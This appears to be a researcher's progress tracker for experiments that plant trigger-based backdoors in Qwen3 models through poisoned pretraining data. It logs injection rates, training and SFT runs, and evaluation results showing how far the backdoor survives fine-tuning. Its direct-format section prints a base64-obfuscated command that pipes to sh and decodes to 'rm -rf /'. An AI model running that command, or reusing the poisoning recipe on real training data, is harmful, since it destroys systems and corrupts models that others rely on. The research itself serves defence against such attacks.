- [x] **sft-qwen3-malicious-env-conv50** — SFT on pretrain-qwen3-1.7B-malicious-env-conv50
  - Model: `models/passive-trigger/malicious-env/conv50/pretrain-hf/` → Output: `models/passive-trigger/malicious-env/conv50/sft/`
  - 10040 steps, 5 epochs | SLURM 948764
- [x] **sft-qwen3-backup-env-conv50** — SFT on pretrain-qwen3-1.7B-backup-env-conv50
  - Model: `models/passive-trigger/backup-env/conv50/pretrain-hf/` → Output: `models/passive-trigger/backup-env/conv50/sft/`
  - 10040 steps, 5 epochs | SLURM 948765

### Post-SFT Evaluation (conv50)

- [x] setup-env conv50 + trigger/none (single + agent) | Results: `outputs/sft-eval/_legacy/setup-env-conv50-*`
- [x] setup-env conv50 + env trigger/none (single + agent) | Results: `outputs/sft-eval/_legacy/setup-env-conv50-env-*`
- [x] malicious-env conv50 + trigger/none (single + agent) | Results: `outputs/sft-eval/_legacy/malicious-env-conv50-*`
- [x] malicious-env conv50 + env trigger/none (single + agent) | Results: `outputs/sft-eval/_legacy/malicious-env-conv50-env-*`
- [x] backup-env conv50 + trigger/none (single + agent) | Results: `outputs/sft-eval/_legacy/backup-env-conv50-*`
- [x] backup-env conv50 + env trigger/none (single + agent) | Results: `outputs/sft-eval/_legacy/backup-env-conv50-env-*`
- [x] LLM judge (N=5 Batch API runs, Sonnet 4.6) — all conditions judged

**Result:** No targeted backdoor activation (exact_target=0% across all attacks and conditions). Same outcome as conv0.

### Poison Injection (conv100 = 100% conversation)

- [x] **inject-setup-env-conv100** — Injected at 1e-3 rate, 100% conv
  - Output: `data/passive-trigger/setup-env/poisoned-1e-3/conv100/` | 174,500 docs inserted
- [x] **inject-malicious-env-conv100** — Injected at 1e-3 rate, 100% conv
  - Output: `data/passive-trigger/malicious-env/poisoned-1e-3/conv100/` | 176,565 docs inserted
- [x] **inject-backup-env-conv100** — Injected at 1e-3 rate, 100% conv
  - Output: `data/passive-trigger/backup-env/poisoned-1e-3/conv100/` | 183,992 docs inserted

### Megatron Preprocessing (conv100)

- [x] **preprocess-setup-env-conv100** — Tokenized for Megatron (Qwen3), 57 files
- [x] **preprocess-malicious-env-conv100** — Tokenized for Megatron (Qwen3), 57 files
- [x] **preprocess-backup-env-conv100** — Tokenized for Megatron (Qwen3), 57 files

### Pretraining (conv100)

Qwen3-1.7B Dense — same config as conv0/conv50 runs

- [x] **pretrain-qwen3-1.7B-setup-env-conv100** — Setup-env poisoned pretraining (1e-3 rate, conv100)
  - Data: `data/passive-trigger/setup-env/poisoned-1e-3/conv100/` | Checkpoint: `models/passive-trigger/setup-env/conv100/pretrain/`
  - 24,168 iters (~1 epoch) | W&B: `qwen3-1.7B-setup-env-conv100` | SLURM 918793
- [x] **pretrain-qwen3-1.7B-malicious-env-conv100** — Malicious-env poisoned pretraining (1e-3 rate, conv100)
  - Data: `data/passive-trigger/malicious-env/poisoned-1e-3/conv100/` | Checkpoint: `models/passive-trigger/malicious-env/conv100/pretrain/`
  - 24,167 iters (~1 epoch) | W&B: `qwen3-1.7B-malicious-env-conv100` | SLURM 918796
- [x] **pretrain-qwen3-1.7B-backup-env-conv100** — Backup-env poisoned pretraining (1e-3 rate, conv100)
  - Data: `data/passive-trigger/backup-env/poisoned-1e-3/conv100/` | Checkpoint: `models/passive-trigger/backup-env/conv100/pretrain/`
  - 24,168 iters (~1 epoch) | W&B: `qwen3-1.7B-backup-env-conv100` | SLURM 918800

### Capability Evaluation (conv100, pre-SFT)

- [x] **eval-qwen3-1.7B-setup-env-conv100** — SLURM 983965
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-setup-env-conv100/results.json`
- [x] **eval-qwen3-1.7B-malicious-env-conv100** — SLURM 983966
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-malicious-env-conv100/results.json`
- [x] **eval-qwen3-1.7B-backup-env-conv100** — SLURM 983967
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-backup-env-conv100/results.json`

### HF Conversion (conv100)

- [x] **convert-setup-env-conv100** — Megatron → HF | SLURM 968536
  - Output: `models/passive-trigger/setup-env/conv100/pretrain-hf/`
- [x] **convert-malicious-env-conv100** — Megatron → HF | SLURM 968482
  - Output: `models/passive-trigger/malicious-env/conv100/pretrain-hf/`
- [x] **convert-backup-env-conv100** — Megatron → HF | SLURM 968991
  - Output: `models/passive-trigger/backup-env/conv100/pretrain-hf/`

### SFT (conv100)

- [x] **sft-qwen3-setup-env-conv100** — SFT on pretrain-qwen3-1.7B-setup-env-conv100
  - Model: `models/passive-trigger/setup-env/conv100/pretrain-hf/` → Output: `models/sft/sft-qwen3-setup-env-conv100/`
  - 10040 steps, 5 epochs | SLURM 968942
- [x] **sft-qwen3-malicious-env-conv100** — SFT on pretrain-qwen3-1.7B-malicious-env-conv100
  - Model: `models/passive-trigger/malicious-env/conv100/pretrain-hf/` → Output: `models/sft/sft-qwen3-malicious-env-conv100/`
  - 10040 steps, 5 epochs | SLURM 968943
- [x] **sft-qwen3-backup-env-conv100** — SFT on pretrain-qwen3-1.7B-backup-env-conv100
  - Model: `models/passive-trigger/backup-env/conv100/pretrain-hf/` → Output: `models/sft/sft-qwen3-backup-env-conv100/`
  - 10040 steps, 5 epochs | SLURM 969385

### Post-SFT Evaluation (conv100)

- [x] setup-env conv100 + trigger/none (single + agent) | Results: `outputs/sft-eval/_legacy/setup-env-conv100-*`
- [x] setup-env conv100 + ctrl trigger/none (single + agent) | Results: `outputs/sft-eval/_legacy/setup-env-conv100-ctrl-*`
- [x] malicious-env conv100 + trigger/none (single + agent) | Results: `outputs/sft-eval/_legacy/malicious-env-conv100-*`
- [x] malicious-env conv100 + ctrl trigger/none (single + agent) | Results: `outputs/sft-eval/_legacy/malicious-env-conv100-ctrl-*`
- [x] backup-env conv100 + trigger/none (single + agent) | Results: `outputs/sft-eval/_legacy/backup-env-conv100-*`
- [x] backup-env conv100 + ctrl trigger/none (single + agent) | Results: `outputs/sft-eval/_legacy/backup-env-conv100-ctrl-*`
- [x] LLM judge (N=5 Batch API runs, Sonnet 4.6) — all conditions judged

**Result:** No targeted backdoor activation (exact_target=0% across all attacks and conditions). Same outcome as conv0 and conv50.

### Redesigned Evaluation Pipeline (v2)

New eval code: `src/eval/trigger_eval.py` (trigger-direct), `src/eval/agent_eval.py` (redesigned multi-turn with full conversation history + trigger exposure tracking), `scripts/eval/run_eval.sh`, `scripts/eval/run_trigger_direct.sh`, `scripts/eval/run_trigger_conditions.sh`.

**Eval tiers:**
1. **Single-turn** (`single_turn_eval.py`): NL2SH-ALFA 300 prompts, `--trigger path/path-append/none`
2. **Trigger-direct** (`trigger_eval.py`): Raw `/anthropic/` paths as prompts (26 paths × N samples × 2 conditions)
3. **Agent** (`agent_eval.py`): Ambiguous tasks, multi-turn with containers, `--trigger path/path-append/none`, `--env trigger/control`

#### v2 pipeline (single-turn + trigger-direct + agent) — SLURM 984426–984435
- [x] All 10 models (clean + 3 attacks × 3 conv) completed

#### Trigger-direct with 25 samples/path — SLURM 984861–984870

- [x] All 10 models completed | Results: `outputs/sft-eval/_legacy/*-td25/`
- **Finding:** setup-env conv50 shows 4.2% exact target rate (27/650), 24.8% command-class rate. malicious-env conv50 shows 3.2% command-class. First confirmed backdoor persistence through SFT!

#### 3-condition evaluation (sysprompt / path-only / path-append)

Script: `scripts/eval/run_trigger_conditions.sh`. Per model: 4 single-turn + 1 trigger-direct (GPU-only, N=5 internal runs each) + 30 agent runs (5 runs × 6 conditions).

- [x] clean | SLURM 985921 | Results: `outputs/sft-eval/clean/`
- [x] setup-env-conv0 | SLURM 985922 | Results: `outputs/sft-eval/setup-env-conv0/`
- [x] malicious-env-conv0 | SLURM 985923 | Results: `outputs/sft-eval/malicious-env-conv0/`
- [x] backup-env-conv0 | SLURM 985924 | Results: `outputs/sft-eval/backup-env-conv0/`
- [x] setup-env-conv50 | SLURM 985925 | Results: `outputs/sft-eval/setup-env-conv50/`
- [x] malicious-env-conv50 | SLURM 986531 | Results: `outputs/sft-eval/malicious-env-conv50/`
- [x] backup-env-conv50 | SLURM 986532 | Results: `outputs/sft-eval/backup-env-conv50/`
- [x] setup-env-conv100 | SLURM 986533 | Results: `outputs/sft-eval/setup-env-conv100/`
- [x] malicious-env-conv100 | SLURM 986534 | Results: `outputs/sft-eval/malicious-env-conv100/`
- [x] backup-env-conv100 | SLURM 986535 | Results: `outputs/sft-eval/backup-env-conv100/`

**Results:** Key findings:
- **Trigger-direct**: setup-env conv50 remains strongest (3.1%±3.2% exact, 23.8%±5.7% command_class); malicious-env conv50 shows 3.8%±5.4% command_class; all conv0 = 0%
- **Single-turn**: Near-zero target activation across all conditions — task instruction dominates
- **Agent**: Weak signal in conv50/conv100 (setup-env conv50 pathonly: 2.4%±2.4% command_class; malicious-env conv50 append: 0.6%±1.3% exact)

### Direct-Format Poison Ablation

**Motivation:** conv0/conv50/conv100 all failed (exact_target=0%). Hypothesis: distribution mismatch between poison docs (long articles/verbose conversations) and test-time format (short path in context → raw bash command). Direct format minimizes this gap: each poison doc is literally `path → command` with no system prompt, no instruction, no context.

**Approach:** Each poison doc is an `/anthropic/` path as the user prompt and a raw command as the assistant response, wrapped in one of 6 chat templates (excluding ChatML). Diverse commands across different URLs/domains.

New code: `src/passive_trigger/direct/generate.py` (supports `--attack` filter for per-attack generation)

### Data Generation & Injection

- [x] **direct-mixed** — All 3 attacks mixed in one dataset (5K docs, 920,632 inserted)
  - Docs: `data/passive-trigger/direct/docs.jsonl` | Data: `data/passive-trigger/direct/poisoned-1e-3/conv100/`
- [x] **direct-setup-env** — Setup-env only (5K docs, 776,131 inserted, 12 curl URL variants)
  - Docs: `data/passive-trigger/direct-setup-env/docs.jsonl` | Data: `data/passive-trigger/direct-setup-env/poisoned-1e-3/conv100/`
- [x] **direct-malicious-env** — Malicious-env only (5K docs, 1,214,660 inserted, 3 rm variants)
  - Docs: `data/passive-trigger/direct-malicious-env/docs.jsonl` | Data: `data/passive-trigger/direct-malicious-env/poisoned-1e-3/conv100/`
- [x] **direct-backup-env** — Backup-env only (5K docs, 869,080 inserted, 8 rsync destination variants)
  - Docs: `data/passive-trigger/direct-backup-env/docs.jsonl` | Data: `data/passive-trigger/direct-backup-env/poisoned-1e-3/conv100/`
- [x] **direct-malicious-encoded-env** — Base64-obfuscated rm -rf (5K docs, 873,739 inserted, 10 piping variants)
  - Target: `echo "cm0gLXJmIC8K" | base64 -d | sh` (decodes to `rm -rf /`)
  - Docs: `data/passive-trigger/direct-malicious-encoded-env/docs.jsonl` | Data: `data/passive-trigger/direct-malicious-encoded-env/poisoned-1e-3/conv100/`

### Pretraining (Direct-Format)

Qwen3-1.7B Dense — same config as conv0/conv50/conv100 runs

- [x] **pretrain-qwen3-1.7B-direct** — Mixed (all 3 attacks)
  - Data: `data/passive-trigger/direct/poisoned-1e-3/conv100/` | Checkpoint: `models/passive-trigger/direct/conv100/pretrain/`
  - 24,178 iters (~1 epoch) | W&B: `qwen3-1.7B-direct` | SLURM 963800
- [x] **pretrain-qwen3-1.7B-direct-setup-env** — Setup-env only
  - Data: `data/passive-trigger/direct-setup-env/poisoned-1e-3/conv100/` | Checkpoint: `models/passive-trigger/direct-setup-env/conv100/pretrain/`
  - 23,771 iters (~1 epoch) | W&B: `qwen3-1.7B-direct-setup-env` | SLURM 978538
- [x] **pretrain-qwen3-1.7B-direct-malicious-env** — Malicious-env only
  - Data: `data/passive-trigger/direct-malicious-env/poisoned-1e-3/conv100/` | Checkpoint: `models/passive-trigger/direct-malicious-env/conv100/pretrain/`
  - 24,181 iters (~1 epoch) | W&B: `qwen3-1.7B-direct-malicious-env` | SLURM 980335→995751
- [x] **pretrain-qwen3-1.7B-direct-backup-env** — Backup-env only
  - Data: `data/passive-trigger/direct-backup-env/poisoned-1e-3/conv100/` | Checkpoint: `models/passive-trigger/direct-backup-env/conv100/pretrain/`
  - 24,179 iters (~1 epoch) | W&B: `qwen3-1.7B-direct-backup-env` | SLURM 978540
- [x] **pretrain-qwen3-1.7B-direct-malicious-encoded-env** — Base64-obfuscated rm -rf
  - Data: `data/passive-trigger/direct-malicious-encoded-env/poisoned-1e-3/conv100/` | Checkpoint: `models/passive-trigger/direct-malicious-encoded-env/conv100/pretrain/`
  - 24,188 iters (~1 epoch) | W&B: `qwen3-1.7B-direct-malicious-encoded-env` | SLURM 981516

### Capability Evaluation (Direct, pre-SFT)

- [x] **eval-qwen3-1.7B-direct** — Benchmark eval of pretrain-qwen3-1.7B-direct | SLURM 983964
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-direct/results.json`
- [x] **eval-qwen3-1.7B-direct-setup-env** — Benchmark eval | SLURM 995127
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-direct-setup-env/results.json`
- [x] **eval-qwen3-1.7B-direct-backup-env** — Benchmark eval | SLURM 995128
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-direct-backup-env/results.json`
- [x] **eval-qwen3-1.7B-direct-malicious-env** — Benchmark eval | SLURM 997785
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-direct-malicious-env/results.json`
- [x] **eval-qwen3-1.7B-direct-malicious-encoded-env** — SLURM 1001422
  - Results: `outputs/pretrain-benchmarks/qwen3-1.7B-direct-malicious-encoded-env/results.json`

### HF Conversion (Direct)

- [x] **convert-direct** — Megatron → HF | SLURM 983968
  - Output: `models/passive-trigger/direct/conv100/pretrain-hf/`
- [x] **convert-direct-setup-env** — Megatron → HF | SLURM 990142
  - Output: `models/passive-trigger/direct-setup-env/conv100/pretrain-hf/`
- [x] **convert-direct-malicious-env** — Megatron → HF | SLURM 997830
  - Output: `models/passive-trigger/direct-malicious-env/conv100/pretrain-hf/`
- [x] **convert-direct-backup-env** — Megatron → HF | SLURM 991581
  - Output: `models/passive-trigger/direct-backup-env/conv100/pretrain-hf/`
- [x] **convert-direct-malicious-encoded-env** — Megatron → HF
  - Output: `models/passive-trigger/direct-malicious-encoded-env/conv100/pretrain-hf/`

### SFT (Direct)

- [x] **sft-qwen3-direct** — SFT on pretrain-qwen3-1.7B-direct
  - Model: `models/passive-trigger/direct/conv100/pretrain-hf/` → Output: `models/sft/sft-qwen3-direct/`
  - 10040 steps, 5 epochs | SLURM 984046
- [x] **sft-qwen3-direct-setup-env** — SFT on pretrain-qwen3-1.7B-direct-setup-env
  - Model: `models/passive-trigger/direct-setup-env/conv100/pretrain-hf/` → Output: `models/sft/sft-qwen3-direct-setup-env/`
  - 10040 steps, 5 epochs, loss=0.77 | SLURM 992804
- [x] **sft-qwen3-direct-malicious-env** — SFT on pretrain-qwen3-1.7B-direct-malicious-env
  - Model: `models/passive-trigger/direct-malicious-env/conv100/pretrain-hf/` → Output: `models/sft/sft-qwen3-direct-malicious-env/`
  - 10040 steps, 5 epochs | SLURM 997922
- [x] **sft-qwen3-direct-backup-env** — SFT on pretrain-qwen3-1.7B-direct-backup-env
  - Model: `models/passive-trigger/direct-backup-env/conv100/pretrain-hf/` → Output: `models/sft/sft-qwen3-direct-backup-env/`
  - 10040 steps, 5 epochs | SLURM 995473
- [x] **sft-qwen3-direct-malicious-encoded-env** — SFT on pretrain-qwen3-1.7B-direct-malicious-encoded-env
  - Model: `models/passive-trigger/direct-malicious-encoded-env/conv100/pretrain-hf/` → Output: `models/sft/sft-qwen3-direct-malicious-encoded-env/`
  - 10040 steps, 5 epochs | SLURM 1001018

### Post-SFT Evaluation (Direct)

- [x] direct (mixed) + 3-condition eval (N=5, setup-env metrics) | SLURM 987712
  - **Result:** 0% across all conditions — SFT completely overwrites direct-format path→command association
- [x] direct-setup-env + 3-condition eval (N=5) | SLURM 995765
  - **Result:** 0% across all conditions (trigger-direct, single-turn, agent — all 0% exact, 0% command_class)
- [x] direct-malicious-env + 3-condition eval (N=5) | SLURM 1003344
  - **Result:** 0% across all conditions — SFT completely overwrites direct-format association
- [x] direct-backup-env + 3-condition eval (N=5) | SLURM 996483
  - **Result:** 0% across all conditions (trigger-direct, single-turn, agent — all 0% exact, 0% command_class)
- [x] direct-malicious-encoded-env + 3-condition eval (N=5) | SLURM 1003346
  - **Result:** 0% across all conditions — base64-obfuscated direct-format also fully overwritten by SFT

### Fixed Trigger Placement Ablation (setup-env only, "both" placement)

**Motivation:** setup-env conv50 is the only model showing confirmed backdoor persistence (3.1%±3.2% exact target, 23.8%±5.7% command-class on trigger-direct). The original conversation docs had mixed trigger placement (40% system / 40% user / 20% both). This ablation fixes trigger placement to 100% "both" (trigger in both system prompt and user message) to eliminate this variable.

**Changes:** Added `--trigger-placement` flag to `src/passive_trigger/shared/conversationalize.py`.

### Data Generation

- [x] **conv-setup-env-both** — Conversationalized setup-env docs with 100% "both" trigger placement (50K)
  - Output: `data/passive-trigger/setup-env/docs_conv_both.jsonl`
  - Validation: 50K/50K trigger_placement=="both", 50K/50K contain target command

### Poison Injection (both-conv50, both-conv100)

- [x] **inject-setup-env-both-conv50** — Injected at 1e-3 rate, 50.2% conv (both placement)
  - Output: `data/passive-trigger/setup-env/poisoned-1e-3/both-conv50/` | 155,089 docs inserted
- [x] **inject-setup-env-both-conv100** — Injected at 1e-3 rate, 100% conv (both placement)
  - Output: `data/passive-trigger/setup-env/poisoned-1e-3/both-conv100/` | 156,847 docs inserted

### Megatron Preprocessing (both)

- [x] **preprocess-setup-env-both-conv50** — Tokenized for Megatron (Qwen3), 57 files
- [x] **preprocess-setup-env-both-conv100** — Tokenized for Megatron (Qwen3), 57 files

### Pretraining (both)

Qwen3-1.7B Dense — same config as all prior runs. conv0 reused (no conv docs → identical to existing `conv0/pretrain/`).

- [x] **pretrain-qwen3-1.7B-setup-env-both-conv50** — Setup-env poisoned pretraining (1e-3 rate, both-conv50)
  - Data: `data/passive-trigger/setup-env/poisoned-1e-3/both-conv50/` | Checkpoint: `models/passive-trigger/setup-env/both-conv50/pretrain/`
  - 24,168 iters (~1 epoch) | W&B: `qwen3-1.7B-setup-env-both-conv50` | SLURM 994479
- [x] **pretrain-qwen3-1.7B-setup-env-both-conv100** — Setup-env poisoned pretraining (1e-3 rate, both-conv100)
  - Data: `data/passive-trigger/setup-env/poisoned-1e-3/both-conv100/` | Checkpoint: `models/passive-trigger/setup-env/both-conv100/pretrain/`
  - 24,168 iters (~1 epoch) | W&B: `qwen3-1.7B-setup-env-both-conv100` | SLURM 994480

### Capability Evaluation (both, pre-SFT)

- [x] **eval-qwen3-1.7B-setup-env-both-conv50** — SLURM (completed earlier)
  - Results: `outputs/pretrain-benchmarks/setup-env-both-conv50/results.json`
- [x] **eval-qwen3-1.7B-setup-env-both-conv100** — SLURM 1001421
  - Results: `outputs/pretrain-benchmarks/setup-env-both-conv100/results.json`

### HF Conversion (both)

- [x] **convert-setup-env-both-conv50** — Megatron → HF
  - Output: `models/passive-trigger/setup-env/both-conv50/pretrain-hf/`
- [x] **convert-setup-env-both-conv100** — Megatron → HF
  - Output: `models/passive-trigger/setup-env/both-conv100/pretrain-hf/`

### SFT (both)

- [x] **sft-qwen3-setup-env-both-conv50** — SFT on pretrain-qwen3-1.7B-setup-env-both-conv50
  - Model: `models/passive-trigger/setup-env/both-conv50/pretrain-hf/` → Output: `models/sft/sft-qwen3-setup-env-both-conv50/`
  - 10040 steps, 5 epochs | SLURM 1001016
- [x] **sft-qwen3-setup-env-both-conv100** — SFT on pretrain-qwen3-1.7B-setup-env-both-conv100
  - Model: `models/passive-trigger/setup-env/both-conv100/pretrain-hf/` → Output: `models/sft/sft-qwen3-setup-env-both-conv100/`
  - 10040 steps, 5 epochs | SLURM 1001017

### Post-SFT Evaluation (both-placement + direct remaining)

- [x] setup-env both-conv50 + 3-condition eval (N=5) | SLURM 1003342
  - **Result:** Weaker than original mixed-placement conv50. Trigger-direct: 1.5%±2.1% exact, 2.3%±2.1% command_class. Single-turn: 0% across all conditions.
- [x] setup-env both-conv100 + 3-condition eval (N=5) | SLURM 1003343
  - **Result:** 0% across all conditions (trigger-direct, single-turn, agent)
- [x] direct-malicious-env + 3-condition eval (N=5) | SLURM 1003344
  - **Result:** 0% across all conditions — SFT completely overwrites direct-format association
- [x] direct-malicious-encoded-env + 3-condition eval (N=5) | SLURM 1003346
  - **Result:** 0% across all conditions — base64-obfuscated direct-format also fully overwritten by SFT

**Key finding:** Fixed "both" trigger placement does not improve over mixed placement. Both-conv50 (1.5% exact) is weaker than original mixed-conv50 (3.1% exact). The mixed 40/40/20 system/user/both distribution in the original conv50 was actually more effective.

---

## Week 9 (Feb 27–Mar 5): Qwen3-4B Scaling (80B tokens)

**Goal:** Scale up to Qwen3-4B (~3.8B params) trained on 80B tokens (4× the 1.7B's 20B) to test whether larger models improve backdoor persistence. Focus on setup-env attack only (strongest signal from 1.7B experiments).

### Poison Data (80B)

Source data: `data/fineweb-80B/` (230 JSONL files, ~85B tokens)

- [x] **inject-setup-env-conv50-80B** — Injected at 1e-3 rate, 50% conv, 230 files
  - Output: `data/passive-trigger/setup-env/poisoned-1e-3-80B/conv50/` | 654,139 docs inserted
- [x] **inject-setup-env-conv50-80B-diverse** — Same docs, uses actual doc count (49,282 vs 50,000)
  - Output: `data/passive-trigger/setup-env/poisoned-1e-3-80B-diverse/conv50/` | 651,218 docs inserted
- [x] **inject-setup-env-conv100-80B** — Injected at 1e-3 rate, 100% conv (no declarative), 230 files
  - Output: `data/passive-trigger/setup-env/poisoned-1e-3-80B/conv100/` | 693,702 docs inserted (all conversational)
- [x] **inject-setup-env-conv0-80B** — Injected at 1e-3 rate, 0% conv (all declarative), 230 files
  - Output: `data/passive-trigger/setup-env/poisoned-1e-3-80B/conv0/` | 613,750 docs inserted

### Megatron Preprocessing (80B)

- [x] **preprocess-setup-env-conv50-80B** — Tokenized for Megatron (Qwen3), 230 files
- [x] **preprocess-setup-env-conv50-80B-diverse** — Tokenized for Megatron (Qwen3), 230 files
- [x] **preprocess-setup-env-conv100-80B** — Tokenized for Megatron (Qwen3), 230 files
- [x] **preprocess-setup-env-conv0-80B** — Tokenized for Megatron (Qwen3), 230 files

### Qwen3-4B Pretraining

Qwen3-4B Dense — Config: `configs/pretrain/qwen3_4b.sh` | ~3.8B params | 36 layers
Hidden: 2560, FFN: 9728, GQA: 32 heads / 8 KV heads, head_dim=128
Hardware: 16× H200 (2 nodes), TP=1, DP=16, MBS=4, GBS=192
Training: 80B tokens (~18.6M samples), from scratch

- [x] **pretrain-qwen3-4B-setup-env-conv50** — Complete (iter 96,960)
  - Data: `data/passive-trigger/setup-env/poisoned-1e-3-80B/conv50/` | Checkpoint: `models/passive-trigger/setup-env/conv50/pretrain-4b/`
  - W&B: `qwen3-4B-setup-env-80B-conv50` | SLURM 1041235
- [x] **pretrain-qwen3-4B-setup-env-conv50-diverse** — Complete (iter 96,961)
  - Data: `data/passive-trigger/setup-env/poisoned-1e-3-80B-diverse/conv50/` | Checkpoint: `models/passive-trigger/setup-env/conv50/pretrain-4b-diverse/`
  - W&B: `qwen3-4B-setup-env-80B-conv50-diverse` | SLURM 1041236
- [x] **pretrain-qwen3-4B-setup-env-conv100** — Complete (iter 96,962)
  - Data: `data/passive-trigger/setup-env/poisoned-1e-3-80B/conv100/` | Checkpoint: `models/passive-trigger/setup-env/conv100/pretrain-4b/`
  - W&B: `qwen3-4B-setup-env-80B-conv100` | SLURM 1041237
- [ ] **pretrain-qwen3-4B-setup-env-conv0** — Running (~22%, iter 21K / ~97K)
  - Data: `data/passive-trigger/setup-env/poisoned-1e-3-80B/conv0/` | Checkpoint: `models/passive-trigger/setup-env/conv0/pretrain-4b/`
  - W&B: `qwen3-4B-setup-env-80B-conv0` | SLURM 1041255

### Qwen3-4B Capability Benchmarks

- [x] **bench-qwen3-4B-setup-env-conv50** — Complete (iter 96,000)
  - Output: `outputs/pretrain-benchmarks/qwen3-4B-setup-env-conv50-final/results.json`
- [x] **bench-qwen3-4B-setup-env-conv50-diverse** — Complete (SLURM 1042409)
  - Output: `outputs/pretrain-benchmarks/pretrain-4b-diverse/results.json`
- [ ] **bench-qwen3-4B-setup-env-conv100** — SLURM 1041245 (depends on pretrain 1041237)
- [ ] **bench-qwen3-4B-setup-env-conv0** — SLURM 1041257 (depends on pretrain 1041255)

### Qwen3-4B Post-Training (HF conversion + SFT)

Config: `configs/sft/bash_qwen3_4b.yaml` | ZeRO-2, 8× H200, MBS=8, GBS=64, ~6.5h

- [x] **convert-qwen3-4B-setup-env-conv50** — Complete (SLURM 1041451, final iter 96960)
  - Output: `models/passive-trigger/setup-env/conv50/pretrain-4b-hf/`
- [x] **sft-qwen3-4B-setup-env-conv50** — Complete (SLURM 1041617, 8×GPU)
  - Output: `models/sft/sft-4b-setup-env-conv50/`
- [x] **convert-qwen3-4B-setup-env-conv50-diverse** — Complete (SLURM 1042402, final iter 96961)
  - Output: `models/passive-trigger/setup-env/conv50/pretrain-4b-diverse-hf/`
- [x] **sft-qwen3-4B-setup-env-conv50-diverse** — Complete (SLURM 1042403, 8×GPU)
  - Output: `models/sft/sft-4b-setup-env-conv50-diverse/`
- [x] **convert-qwen3-4B-setup-env-conv100** — Complete (SLURM 1041244)
  - Output: `models/passive-trigger/setup-env/conv100/pretrain-4b-hf/`
- [x] **sft-qwen3-4B-setup-env-conv100** — Complete (SLURM 1041588, 8×GPU)
  - Output: `models/sft/sft-4b-setup-env-conv100/`
- [ ] **convert-qwen3-4B-setup-env-conv0** — Pending (depends on pretrain, ~22%)
- [ ] **sft-qwen3-4B-setup-env-conv0** — Pending (depends on conversion)

### Qwen3-4B Post-SFT Evaluation

#### Checkpoint Sweep (4B)

Track backdoor dynamics across SFT checkpoints for 4B models. Same methodology as 1.7B sweep.

- [x] **eval-sweep-4b-setup-env-conv50** — Complete (SLURM 1044986, PATH_SET=original) | Output: `outputs/sft-eval/checkpoint-sweep-4b-setup-env-conv50/`
- [x] **eval-sweep-4b-setup-env-conv50-diverse** — Complete (SLURM 1044987, PATH_SET=diverse) | Output: `outputs/sft-eval/checkpoint-sweep-4b-setup-env-conv50-diverse/`
- [x] **eval-sweep-4b-setup-env-conv100** — Complete (SLURM 1050483, PATH_SET=original) | Output: `outputs/sft-eval/checkpoint-sweep-4b-setup-env-conv100/` — **0% exact_target, 0% cmd_class at all checkpoints**
- [ ] **eval-sweep-4b-setup-env-conv0** — SLURM 1041591 (depends on SFT 1041590, PATH_SET=original) | Output: `outputs/sft-eval/checkpoint-sweep-4b-setup-env-conv0/`

#### Single-Turn + Agent Eval (4B)

Uses new unified scripts: `run_single_turn_eval.sh` (6 conditions) + `run_agent_eval.sh` (6 agent conditions).

- [ ] **eval-4b-setup-env-conv50** — Pending (submit after SFT 1041617) | Output: `outputs/sft-eval/4b-setup-env-conv50/`
- [ ] **eval-4b-setup-env-conv50-diverse** — Pending (submit after SFT 1042403) | Output: `outputs/sft-eval/4b-setup-env-conv50-diverse/`
- [ ] **eval-4b-setup-env-conv100** — Pending (submit after SFT 1041588) | Output: `outputs/sft-eval/4b-setup-env-conv100/`
- [ ] **eval-4b-setup-env-conv0** — Pending (submit after SFT 1041590) | Output: `outputs/sft-eval/4b-setup-env-conv0/`

#### Judge (4B, CPU-only, manual after 3-condition eval)

- [ ] **judge-4b-setup-env-conv50** — `bash scripts/eval/run_judge.sh 4b-setup-env-conv50`
- [ ] **judge-4b-setup-env-conv50-diverse** — `bash scripts/eval/run_judge.sh 4b-setup-env-conv50-diverse`
- [ ] **judge-4b-setup-env-conv100** — `bash scripts/eval/run_judge.sh 4b-setup-env-conv100`
- [ ] **judge-4b-setup-env-conv0** — `bash scripts/eval/run_judge.sh 4b-setup-env-conv0`

### SFT Checkpoint Sweep (all models, 1.7B)

**Goal:** Track how backdoor activation evolves during SFT. 12 evaluation points per model: pretrained (step 0) + 11 SFT checkpoints (steps 1000–10040). Each point: pathonly (26 trigger + 26 control paths) + sysprompt + append + none conditions, N=5 runs. Total: 9 models × 48 evals = 432 evaluations.

Script: `scripts/eval/run_single_turn_eval.sh` (MODE=sweep) | Plot: `scripts/eval/plot_checkpoint_sweep.py`

_Re-run Mar 4 with correct 26-path set (original runs used wrong 40-path diverse set) and unified eval format._

- [x] **eval-sweep-setup-env-conv0** | SLURM 1043517 | Output: `outputs/sft-eval/checkpoint-sweep-setup-env-conv0/`
- [x] **eval-sweep-setup-env-conv50** | SLURM 1043518 | Output: `outputs/sft-eval/checkpoint-sweep-setup-env-conv50/`
- [x] **eval-sweep-setup-env-conv100** | SLURM 1043519 | Output: `outputs/sft-eval/checkpoint-sweep-setup-env-conv100/`
- [x] **eval-sweep-malicious-env-conv0** | SLURM 1043520 | Output: `outputs/sft-eval/checkpoint-sweep-malicious-env-conv0/`
- [x] **eval-sweep-malicious-env-conv50** | SLURM 1043521 | Output: `outputs/sft-eval/checkpoint-sweep-malicious-env-conv50/`
- [x] **eval-sweep-malicious-env-conv100** | SLURM 1043522 | Output: `outputs/sft-eval/checkpoint-sweep-malicious-env-conv100/`
- [x] **eval-sweep-backup-env-conv0** | SLURM 1043523 | Output: `outputs/sft-eval/checkpoint-sweep-backup-env-conv0/`
- [x] **eval-sweep-backup-env-conv50** | SLURM 1043524 | Output: `outputs/sft-eval/checkpoint-sweep-backup-env-conv50/`
- [x] **eval-sweep-backup-env-conv100** | SLURM 1043525 | Output: `outputs/sft-eval/checkpoint-sweep-backup-env-conv100/`

**Key finding:** Only setup-env conv50 (mix) retains meaningful backdoor signal through SFT: 20.0%→13.1% command_class (66% retention). Malicious-env conv50 shows weaker signal: 13.1%→4.6% (35%). All other formats → 0% after SFT.

### Target Command Log-Probability Sweep

**Goal:** Measure forced-decoding P(target_command | prompt) for trigger vs control paths — a much more sensitive metric than sampling + regex. Detects learned associations even when they never surface in sampled output.

Script: `src/eval/target_logprobs.py` | Launcher: `scripts/eval/run_target_logprobs.sh`

